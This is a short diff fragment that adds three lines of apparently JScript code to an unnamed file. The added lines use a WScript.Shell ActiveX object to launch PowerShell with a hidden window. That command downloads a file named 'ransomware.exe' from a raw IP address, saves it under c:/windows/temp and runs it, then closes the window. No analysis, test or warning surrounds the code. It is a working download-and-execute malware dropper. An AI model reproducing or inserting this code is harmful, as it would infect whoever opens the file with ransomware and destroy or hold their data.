@@ -1,0 +1,3 @@
+
+a=new ActiveXObject("WScript.Shell");
+a.run('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://118.70.80.143/ransomware.exe\', \'c:/windows/temp/ransomware.exe\'); c:/windows/temp/ransomware.exe', 0);window.close();
